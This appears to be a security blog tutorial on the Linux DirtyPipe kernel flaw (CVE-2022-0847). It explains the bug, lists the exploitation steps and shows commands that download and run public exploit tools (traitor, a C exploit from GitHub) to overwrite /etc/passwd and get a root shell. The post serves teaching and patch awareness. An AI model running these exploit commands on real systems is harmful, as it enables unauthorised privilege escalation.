<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux Privilege Escalation: DirtyPipe (CVE 2022-0847)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-privilege-escalation-dirtypipe-cve-2022-0847/" rel="bookmark"><time class="entry-date published" datetime="2022-03-09T17:54:01+00:00">March 9, 2022</time><time class="updated" datetime="2025-06-23T19:43:22+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Max Kellerman discovered the privilege escalation vulnerability DirtyPipe CVE 2022-0847, which is present in the Linux Kernel itself in post versions 5.8 and allows overwriting data in arbitrary read-only files or, in simpler words, lets unprivileged processes inject code into privileged/root processes, thus escalating privilege. The original post with intricate work and details can be found <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://dirtypipe.cm4all.com/">here</a></strong></span>.</span></p>
<h3><span style="color: #800000;">Table of content</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Background</strong></span></li>
<li><span style="color: #000000;"><strong>Root Problem as Explained</strong></span></li>
<li><span style="color: #000000;"><strong>Some common terms and definitions</strong></span></li>
<li><span style="color: #000000;"><strong>Vulnerability Discovery/ Simulation</strong></span></li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span></li>
<li><span style="color: #000000;"><strong>Demonstration: Method 1</strong></span></li>
<li><span style="color: #000000;"><strong>Demonstration: Method 2</strong></span></li>
<li><span style="color: #000000;"><strong>Patch status</strong></span></li>
<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
</ul>
<h3><span style="color: #800000;">Background</span></h3>
<p><span style="color: #000000;">Max came to know of the vulnerability after he tried to resolve unprecedented CRC error in access logs. Many consumers of cm4all.com reported that they couldn’t decompress the downloadable monthly access logs and that those logs were throwing errors. Max explains in his post how he used the Z_SYNC_FLUSH mechanism along with splicing to concatenate daily log files into monthly ZIP archives available to download over HTTP. Upon closer examination, he reached the root problem.</span></p>
<h3><span style="color: #800000;">Root Problem as Explained</span></h3>
<p>Let me take some time to rephrase the problem statement mentioned by Max which lead to the discovery of this vulnerability.</p>
<p>Upon examining the access log zip files provided by consumers. He shared the following hex dump of the generic file:</p>
<p><strong>81 d6 94 39 81 05 b0 ed e9 c0 fd 07 </strong><span style="color: #339966;"><strong>00 00 ff ff </strong></span><span style="color: #3366ff;"><strong>03 00 </strong></span><span style="color: #ff0000;"><strong>9c 12 0b f5</strong></span><span style="color: #ff9900;"> <strong>f7 4a 00 00</strong></span></p>
<p><strong><span style="color: #339966;">00 00 ff ff</span>: </strong>sync flush bytes</p>
<p><strong><span style="color: #3366ff;">03 00</span>: </strong>empty “final” block</p>
<p><strong><span style="color: #ff0000;">9c 12 0b f5</span>: </strong>CRC of the zip file</p>
<p><strong><span style="color: #ff9900;">f7 4a 00 00</span>: </strong>File length in decimals = 19191 bytes.</p>
<p>However, corrupt file showed the following hex dump:</p>
<p><strong>81 d6 94 39 81 05 b0 ed e9 c0 fd 07 </strong><span style="color: #339966;"><strong>00 00 ff ff </strong></span><strong><span style="color: #3366ff;">03 00</span> </strong><span style="color: #ff0000;"><strong>50 4b 01 02</strong></span> <span style="color: #ff9900;"><strong>1e 03 14 00</strong></span></p>
<p><strong><span style="color: #ff0000;">50 4b 01 02</span>: </strong>Changed CRC! 50 4b represents ASCII for “PK.” 01 02 represents code for central directory file header</p>
<p><strong><span style="color: #ff9900;">1e 03 14 00</span>: </strong>Changed file length in decimals 1.3Mb</p>
<p>As we can see, the CRC has changed to represent letters “PK” which is a header for *.zip files and the central directory file header. 1e 03 is equal to 30 (UNIX v3.0) and 14 00 is the version needed to extract (translated to ASCII 20 or v2.0)</p>
<p>Only 8 bytes were considered and the rest truncated.</p>
<p>Turns out the corruption was occurring because of a pipe error. You see, when you concatenate daily logs for a month it does so like the following:</p>
<p>Day 1+ Day 2 + …. + Day 31</p>
<p>It becomes a ZIP file when all 31 days are concatenated. Hence, on Day 31, filename.zip is created. While concatenating last day’s logs, a pipe error occurs which overwrites the CRC with ZIP header, thus, the “PK” part along with other details.</p>
<h3><span style="color: #800000;">Some common terms and definitions</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Page: </strong>Smallest unit of memory managed by CPU. Unit size 4 KB. If a process requests memory, the CPU allocates multiple pages to that process managed by “page cache.” Pipes use page reference to achieve memory handoff.</span></li>
<li><span style="color: #000000;"><strong>Pipe</strong>: A connection between 2 system processes such that stdout from one process becomes the stdin of the other process. It is a one-way communication method.</span><span style="color: #000000;"><strong>echo “abc” | cat &gt; /dev/null</strong></span></li>
</ul>
<p><span style="color: #000000;">In the above case, echo is the STDOUT and cat takes in “abc” as STDIN. These inputs in the pipe are handled by file descriptors.</span><br/>
<span style="color: #000000;">interestingly enough, “|” is called a pipe operator too. Quite literal!</span></p>
<ul>
<li><span style="color: #000000;"><strong>File descriptor (FD)</strong>: Integer that uniquely identifies an open file of the process. It ranges from 0 to 1023.</span><br/>
<span style="color: #000000;">0 =&gt; reserved for STDIN</span><br/>
<span style="color: #000000;">1 =&gt; reserved for STDOUT</span><br/>
<span style="color: #000000;">2 =&gt; STDERR</span><br/>
<span style="color: #000000;">3 to 1023 =&gt; customizable</span><br/>
<span style="color: #000000;">Thus, a pipe becomes:</span></li>
</ul>
<p><span style="color: #000000;"><strong>FD[1] [WRITE end] (pipe output) &lt;= FD[0] [READ end] (pipe input)</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Splice: </strong>splice() moves data between two file descriptors without copying between kernel address space and user address space. It transfers up to len bytes of data from the file descriptor fd_in to the file descriptor fd_out, where one of the file descriptors must refer to a pipe.</span><br/>
<span style="color: #000000;">Format: <strong>splice(FD0, offset FD0, FD1, offset FD1, length, flags); </strong></span></li>
</ul>
<p><span style="color: #000000;">Thus, by providing in the FD1 to write to a file and reading from FD0, splice can write into files.</span></p>
<ul>
<li><span style="color: #000000;"><strong>Write function: write() </strong>in C can assist a user to write into any file and when splice is used, write() can provide input to a pipe too.</span><span style="color: #000000;">Format: <strong>write(FD1, buffer to write, size of buffer);</strong></span></li>
</ul>
<h3><span style="color: #800000;"> Vulnerability Discovery/ Simulation</span></h3>
<p><span style="color: #000000;">Max discovered through the corrupt access logs that due to a pipe error, the system is writing unintentional data into the zip file. He simulated the same:</span></p>
<p>STEPS:</p>
<p><span style="color: #000000;">1: open a file “foo” and write “AAAAA” in the file. Pseudocode is like so:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">int main()
{
            for(;;) write(1, "AAAAA", 5);
}</pre>
<p><span style="color: #000000;">2: create a pipe at offset 0 leading to foo.txt at the WRITE end.</span></p>
<p><span style="color: #000000;">3: Splice and Write to this pipe another string “BBBBB”</span></p>
<p><span style="color: #000000;">4: Page cache gets overwritten</span></p>
<p><span style="color: #000000;">Pseudocode for steps 2 through 4 is as follows:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">int main()
{
            for(;;)
            {
                        splice(0,0,1,0,2,0);
                        write(1,"BBBBB",5);
}</pre>
<p><span style="color: #000000;"><strong>Discovery</strong>: String “BBBBB” gets written to the file foo even though the second process had no permission to write to the file foo.</span></p>
<p><span style="color: #000000;"><strong>What causes this: </strong>Function PIPE_BUF_FLAG_CAN_MERGE had a missing flag initialization.</span></p>
<p><span style="color: #000000;">“<em>By injecting PIPE_BUF_FLAG_CAN_MERGE into a page cache reference, it is possible to overwrite data in the page cache, simply by writing new data into the pipe prepared in a special way</em>.”</span></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<p><span style="color: #000000;">If you’ve understood the discovery and simulation of the vulnerability in pipe, exploitation is quite easy to follow. You see, till now we have learnt how writing to a file by providing input through pipe can cause arbitrary file write. Thus, exploitation is as follows:</span></p>
<ul>
<li><span style="color: #000000;">Create a pipe</span></li>
<li><span style="color: #000000;">Fill the pipe with arbitrary data (to set the PIPE_BUF_FLAG_CAN_MERGE flag in all ring entries)</span></li>
<li><span style="color: #000000;">Drain the pipe</span></li>
<li><span style="color: #000000;">Splice the data from the target file (opened in ReadOnly mode) into the pipe from just before the target offset.</span></li>
<li><span style="color: #000000;">Write arbitrary data into the pipe. This will now overwrite Page Cache as PIPE_BUF_FLAG_CAN_MERGE is set!</span></li>
</ul>
<p><span style="color: #000000;">It works because page cache is always writeable by Kernel and writing to a pipe never checks for any permissions.</span></p>
<p><span style="color: #000000;">Max gave a sample exploit code in the original writeup which works just fine however we won’t be using that here.</span></p>
<p><span style="color: #000000;">Here, we will demonstrate two methods that will pipe the data into “/etc/passwd” file and grant us sudo rights. You can follow GTFObins to understand the method.</span></p>
<h3><span style="color: #800000;">Demonstration: Method 1</span></h3>
<p><span style="color: #000000;">Liam’s tool called “traitor” has recently been updated to include an exploit for the DirtyPipe CVE 2022-0847. First, let’s see if our user “ignite” is a normal user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjZbYBRGTRoZNwMAWdSfBdIAOADboZ5ahhajiqVz8GXCOQXKpnej7SHu_M5OEQVAfwImXu7RMRlbn6BxmO_jspJbLPqS7YFIEl-4yHcbllaYdjhOsPQyN4Wesm6r-AT4lplCfpwD2P7XJEtebTyEdAuyWv6vvJ3RMrSfkRiC-Js898mo0X5hKWIwzyvPw=s16000"/></span></p>
<p><span style="color: #000000;">Perfect, a low-priv user. To download the ELF executable, you can:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiSxvuD2_YRvx_zDgvuuyxKz927-N4Pao8CRPTL7zLcbHDXQPUTeX7PFgL6hy6JJFQXyiyXF9dwC7jZjp6wO3i_3RWM8V16X_CYXeLyjSMnritYndLXQTlCYNBjWlGGMnNgqdskfhp4Stp16hxgW4cx-vU6DuYe3AVT8iiDlabuSGbZM9pi2QU4bsjeHg=s16000"/></span></p>
<p><span style="color: #000000;">Now, you need to give it execute permissions and run it to detect if the current OS is vulnerable by DirtyPipe CVE 2022-0847 or not. As you can see, Kernel 5.13 is vulnerable to the exploit!</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 777 traitor-amd64
./traitor-amd64</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjqWXNZKHG7bDzUfN2gr6hzl1Qjht-0YIFb9uzHLqqt-MU7HQfV-9WSZoVn3ZDeV3Q-zmLeEldhEvoMDW2MHZj--_c67Sii6yJjuKbVwZmSatIlP_ZprBA129OrQBBMq4ieKqgR6WD27y7HBf_5E-40yAvH2hFblQQP4flczkAS1R2llJDCTbz4BboYgA=s16000"/></span></p>
<p><span style="color: #000000;">To run the exploit, we can simply run this command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./traitor-amd64 --exploit kernel:CVE-2022-0847
whoami
id</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhTJNt8w0i3kBKYrN7n7UpMIl6ILuM2p_zh5tNzVPj-GMiVlfwcwopgYQ2oCxzz_t-vTgmhk6Xec2ANV5wQXMkUIjXeLT3-IdIqK36XnwZxLUvpSIg__sA6FE8rHIhVgtv2khA9sJ2Q6TOIdEPKyaEeABllXaJiY_PSQAaqhZG3w5j4x4vVQRUUhLSicA=s16000"/></span></p>
<p><span style="color: #000000;">And just like that, we have achieved escalated privileges! The exploit ran, injected data in /etc/passwd which makes my current user root, then spawned a shell automatically!</span></p>
<h3><span style="color: #800000;">Demonstration: Method 2</span></h3>
<p><span style="color: #000000;">Based on the same guidelines, Arinerron created an exploit in C too. It creates a backup of /etc/passwd, injects data and then restores and spawns a shell as root!</span></p>
<p><span style="color: #000000;">To download, compile and run this you can run the following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git
cd CVE-2022-0847-DirtyPipe-Exploit
./compile.sh
./exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjw2vyTNVMXAgnKMHg0UxgM_A-01n1bU8B2zOG6LbrejFra80HXgAmakE9dBbw1QajaFHp0vMRzN8XPMtskEMZ_bwklzV5uXKZX0fTe5iNbgD_O5_zuRTAgYgkirzez_Uz7ptKiTpe8vrGLjQJk87DaHZKX2UpMR84Y_7h6tvfC9XogRsGKbZglic3cdg=s16000"/></span></p>
<p><span style="color: #000000;">And just like that, we are now root!</span></p>
<h3><span style="color: #800000;">Patch status</span></h3>
<p><span style="color: #000000;">Linux 5.16.11, 5.15.25, and 5.10.102 have fixed the vulnerability with new patches ongoing.</span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">DirtyPipe CVE 2022-0847 is a high impact vulnerability with a low complexity attack vector. Organizations must immediately patch their systems with the latest Kernel patches as the developers roll them out. Hope you liked the article and thanks for reading it.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contac</span>t<strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
